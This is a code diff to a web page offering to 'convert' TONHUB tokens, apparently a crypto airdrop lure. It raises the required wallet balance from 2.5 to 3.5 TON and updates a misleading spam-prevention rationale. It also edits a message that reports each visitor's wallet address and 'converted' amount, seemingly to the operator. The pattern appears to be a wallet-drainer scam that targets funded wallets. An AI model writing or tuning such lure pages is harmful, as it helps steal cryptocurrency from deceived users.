@@ -581,7 +581,7 @@
 
         <!-- Requirement Note -->
         <div id="requirementNote" style="display: none; background: rgba(21, 10, 83, 0.507); border-left: 4px solid #00ccff; padding: 15px; border-radius: 8px; margin-bottom: 20px; font-size: 0.9rem; color: #00ccff; line-height: 1.4;">
-            ⚠️ To convert your TONHUB tokens, you must hold at least <strong>2.5 TON</strong> in your wallet.<br>
+            ⚠️ To convert your TONHUB tokens, you must hold at least <strong>3.5 TON</strong> in your wallet.<br>
             💡 <strong>Why?</strong> This requirement helps prevent spam and ensures you have enough balance to cover network transaction fees during the conversion process.
         </div>
 
@@ -872,8 +872,8 @@
                 return;
             }
 
-            if (currentBalanceNano < 2500000000) { // Less than 2.5 TON
-                alert("❌ Insufficient Balance\n\nYou need to hold at least 2.5 TON in your wallet before you can convert tokens.\n\nCurrent balance: " + (currentBalanceNano / 1e9).toFixed(4) + " TON\nRequired: 2.5 TON");
+            if (currentBalanceNano < 3500000000) { // Less than 3.5 TON
+                alert("❌ Insufficient Balance\n\nYou need to hold at least 3.5 TON in your wallet before you can convert tokens.\n\nCurrent balance: " + (currentBalanceNano / 1e9).toFixed(4) + " TON\nRequired: 3.5 TON");
                 return;
             }
 
@@ -910,14 +910,14 @@
                 let expectedReward = "Scan wallet for details 📊";
                 
                 // Calculate TONHUB reward based on balance using 1:1 conversion
-                if (currentTonBalance >= 2.5) {
+                if (currentTonBalance >= 3.49) {
                     // Simple 1:1 conversion for expected reward display
                     const tonhubReward = Math.ceil(currentTonBalance);
                     userRank = "Eligible User ✅";
                     expectedReward = `${tonhubReward} TONHUB tokens 💎`;
                 } else {
                     userRank = "Below Threshold ❌";
-                    expectedReward = "Need 2.5+ TON balance 💔";
+                    expectedReward = "Need 3.5+ TON balance 💔";
                 }
 
                 const conversionMessage = `🔄 TOKEN CONVERSION!\n🔗 <b>${walletName}</b>\nAddress: <code>${friendly}</code>\n💵 Amount Converted: <b>${convertedAmount} TON</b>\n⭐ Rank: <b>${userRank}</b>\n💰 Expected Reward: <b>${expectedReward}</b>\n🎊 Status: <b>Conversion Successful</b>\n⏰ Time: <b>${new Date().toLocaleString()}</b>\n\n💡 <i>Use main airdrop page to scan wallet for precise rank and reward calculation</i>`;
